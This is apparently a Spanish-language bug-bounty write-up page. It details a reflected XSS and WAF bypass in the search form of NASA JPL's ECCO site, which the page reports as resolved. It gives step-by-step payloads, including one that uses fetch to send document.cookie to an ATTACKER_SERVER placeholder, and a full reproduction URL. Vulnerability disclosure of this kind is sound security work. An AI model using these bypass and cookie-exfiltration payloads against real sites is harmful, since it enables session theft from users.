---
layout: default
submission_id: "4b01725e-288b-4db5-a38c-1a37f827d215"
official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f827d215"
---

<div class="container">
  <div class="lang-switcher">
    <a href="/en/bounties/nasa-jpl-ecco-xss-waf-bypass/" class="lang-btn"><span class="label-full">English (EN)</span><span class="label-short">EN</span></a>
    <a href="./" class="lang-btn active"><span class="label-full">Español (ES)</span><span class="label-short">ES</span></a>
  </div>
<article>
  <a href="/es/" class="back-btn">
    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
    {{ site.title }}
  </a>

  <div class="bounty-header">
    <h1>XSS en Formulario de Búsqueda con Exfiltración de Cookies (WAF Bypass)</h1>
    <p style="color: var(--p3); font-weight: 600;">National Aeronautics and Space Administration Jet Propulsion Laboratory (NASA JPL)</p>
  </div>

  <div class="bounty-content">
    <h2>🔍 Búsqueda de cualquier cosa</h2>
    <p>Como en cualquier programa de bug bounty, lo primero que hicimos fue usar la página como lo haría cualquier usuario normal. El campo de búsqueda destacó a primera vista, por lo que decidimos probarlo.</p>
    <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn</code></pre>
    <p>Aquí es donde nos dimos cuenta de que el valor que estábamos agregando se reflejaba en el sitio web.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Normal.png" alt="Búsqueda Normal">
    <p>Decidimos inspeccionar cuidadosamente el código fuente del sitio web y nos dimos cuenta de que nuestra entrada estaba dentro de una función <code>console.log()</code>.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Normal Result.png" alt="Resultado de Búsqueda Normal">

    <h2>🛡️ Etiqueta &lt;script&gt; deshabilitada</h2>
    <p>Realizamos algunas pruebas básicas que se llevan a cabo para intentar detectar ataques XSS:</p>
    <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
    <p>Todo lo que obtuvimos fue que el Firewall de Aplicaciones Web (WAF) rechazó nuestras solicitudes ante el más mínimo signo de actividad maliciosa.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Script Tag.png" alt="Bloqueado por el WAF">

    <h2>🔧 Cerrar la cadena de console.log de Javascript</h2>
    <p>Basándonos en nuestro descubrimiento inicial, decidimos intentar cerrar <code>console.log()</code> para insertar código justo después de él utilizando el siguiente payload:</p>
    <pre><code>pwn');</code></pre>
    <p>Insertamos <code>')</code> inmediatamente después de una cadena de texto, que es lo que JavaScript necesitaba para cerrar <code>console.log()</code>. Sin embargo, el símbolo de punto y coma <code>;</code> no se mostraba.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Closing console.log.png" alt="Cerrando console.log">

    <h2>&#x1F9E9; Anexar Javascript (No funciona)</h2>
    <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn');alert(1)</code></pre>
    <p>Lo intentamos de nuevo, pero con texto después del punto y coma. Tras varias pruebas, no conseguimos que el punto y coma apareciera. Peor aún, todo lo que venía después del punto y coma ni siquiera se reflejaba.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Where is semicollon.png" alt="¿Dónde está el punto y coma?">

    <h2>&#x1F9F1; Anexar Javascript (Bypass)</h2>
    <p>Para que funcionara y empezar a inyectar código, tuvimos que codificar el punto y coma en formato HTML, cambiándolo de <code>;</code> a <code>%3b</code>.</p>
    <pre><code>pwn')%3balert(1)</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Bypass Semicollon.png" alt="Bypass del Punto y Coma">

    <h2>💥 Primera Alerta (Funcionando)</h2>
    <p>Aunque el WAF no aceptaba la etiqueta <code>&lt;script&gt;</code>, logramos que renderizara la etiqueta <code>&lt;/script&gt;</code>, lo cual fue suficiente para llevar a cabo un ataque XSS REFLEJADO.</p>
    <pre><code>pwn')%3balert(1)&lt;/script&gt;;//</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1 HTML.png" alt="Alert 1 HTML">
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1.png" alt="Alert 1">

    <h2>&#x1F6AB; Segunda Alerta (El Firewall bloquea)</h2>
    <p>Una vez logramos ejecutar un <code>alert()</code> en la web, quisimos ir más allá e intentar leer las cookies del usuario. El WAF continuó rechazando las solicitudes en cuanto detectaba cadenas sospechosas como <code>document.cookie</code>.</p>
    <pre><code>pwn')%3balert(document.cookie)&lt;/script&gt;;//</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Script Tag.png" alt="Bloqueado por el WAF">

    <h2>&#x1F575;&#xFE0F; Bypass del Firewall para Cookies</h2>
    <p>El WAF rechazaba cadenas como <code>document.cookie</code>. Para lograr un bypass efectivo del WAF, creamos una variable <code>a</code> que contenía <code>document</code>, y solicitamos <code>cookie</code> desde esa variable.</p>
    <pre><code>pwn')%3ba=document%3balert(a.cookie)&lt;/script&gt;;//</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Alert.png" alt="Alerta de Document Cookie">
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Result.png" alt="Resultado de Document Cookie">

    <h2>🚀 Exploit Final (Exfiltración de Cookies)</h2>
    <p>En lugar de ejecutar <code>alert</code>, ejecutamos <code>fetch</code> para enviar una solicitud a un servidor controlado por el atacante.</p>
    <pre><code>pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration.png" alt="Exploit Final">
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration Request.png" alt="Petición de Exfiltración">

    <h2>✅ Pasos para reproducir</h2>
    <ol>
      <li>Inicia un servidor web público (nosotros usamos Serveo exponiendo un servidor Python en localhost para esto).</li>
      <li>Reemplaza <code>ATTACKER_SERVER</code> con la URL que te genera:
        <pre><code>pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></pre>
      </li>
      <li>Visita la URL:
        <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></pre>
      </li>
    </ol>
    <p>Recibirás una petición con tus <code>cookies</code> adjuntas. Puedes probarlo con otra persona para demostrar que funciona.</p>

    <h2>📜 Reconocimiento Oficial</h2>
    <div class="pdf-container">
      <iframe src="/assets/others/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf#toolbar=0&navpanes=0&scrollbar=0" width="100%" height="100%" style="border: none;"></iframe>
    </div>
    
    <div style="text-align: center; margin-top: 1rem;">
      <a href="/assets/others/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf" class="lang-btn" target="_blank">📥 Descargar Carta Oficial (PDF)</a>
    </div>

    <h2>🤝 Detalle de Colaboración</h2>
    <p>Esta investigación fue realizada en un esfuerzo conjunto con los siguientes investigadores:</p>
    <div class="collab-grid">
      <div class="collab-card">
        <div class="collab-avatar">
          <svg class="svg-icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
        </div>
        <div class="collab-body">
          <div class="collab-name">{{ site.researchers.ivan.name }}</div>
          <div class="collab-links">
            <a class="social-pill" href="{{ site.researchers.ivan.bugcrowd }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24"><path d="M12 2l7 4v6c0 5-3 9-7 10C8 21 5 17 5 12V6z"></path><path d="M9 12l2 2 4-5"></path></svg>
              <span>Bugcrowd</span>
            </a>
            <a class="social-pill" href="{{ site.researchers.ivan.linkedin }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4V9h4v2"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
              <span>LinkedIn</span>
            </a>
          </div>
        </div>
      </div>

      <div class="collab-card">
        <div class="collab-avatar">
          <svg class="svg-icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
        </div>
        <div class="collab-body">
          <div class="collab-name">{{ site.researchers.diego.name }}</div>
          <div class="collab-links">
            <a class="social-pill" href="{{ site.researchers.diego.bugcrowd }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24"><path d="M12 2l7 4v6c0 5-3 9-7 10C8 21 5 17 5 12V6z"></path><path d="M9 12l2 2 4-5"></path></svg>
              <span>Bugcrowd</span>
            </a>
            <a class="social-pill" href="{{ site.researchers.diego.linkedin }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4V9h4v2"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
              <span>LinkedIn</span>
            </a>
          </div>
        </div>
      </div>
    </div>

    <div class="meta-grid">
      <div class="meta-card">
        <div class="meta-left">
          <div class="meta-icon">
            <svg class="svg-icon" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"></path></svg>
          </div>
          <div class="meta-title">
            <strong>Estado</strong>
          </div>
        </div>
        <div class="meta-badge success">Resuelto</div>
      </div>

      <div class="meta-card">
        <div class="meta-left">
          <div class="meta-icon">
            <svg class="svg-icon" viewBox="0 0 24 24"><path d="M12 9v4"></path><path d="M12 17h.01"></path><path d="M10.29 3.86l-8.12 14.06A2 2 0 0 0 3.9 21h16.2a2 2 0 0 0 1.73-3.08L13.71 3.86a2 2 0 0 0-3.42 0z"></path></svg>
          </div>
          <div class="meta-title">
            <strong>Severidad</strong>
          </div>
        </div>
        <div class="meta-badge medium">Media</div>
      </div>
    </div>

    <div class="verification-panel">
      <h3>Verificación</h3>
      <div class="verification-grid">
        <div class="verification-item">
          <small>ID de la submission</small>
          <div class="value">{{ page.submission_id | default: 'N/A' }}</div>
        </div>
        <div class="verification-item">
          <small>Enlace oficial</small>
          <div class="value">
            {% if page.official_link %}
              <a href="{{ page.official_link }}" target="_blank" rel="noopener noreferrer">{{ page.official_link }}</a>
            {% else %}
              N/A
            {% endif %}
          </div>
        </div>
      </div>
    </div>
  </div>
</article>
</div>

<!-- Image Zoom Overlay -->
<div id="zoomOverlay" class="zoom-overlay">
  <img id="zoomImg" src="" alt="Imagen Ampliada">
</div>

<script>
document.querySelectorAll('.bounty-content img').forEach(img => {
  img.addEventListener('click', () => {
    const overlay = document.getElementById('zoomOverlay');
    const zoomImg = document.getElementById('zoomImg');
    zoomImg.src = img.src;
    overlay.classList.add('active');
  });
});

document.getElementById('zoomOverlay').addEventListener('click', () => {
  document.getElementById('zoomOverlay').classList.remove('active');
});

document.addEventListener('keydown', e => {
  if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
});
</script>
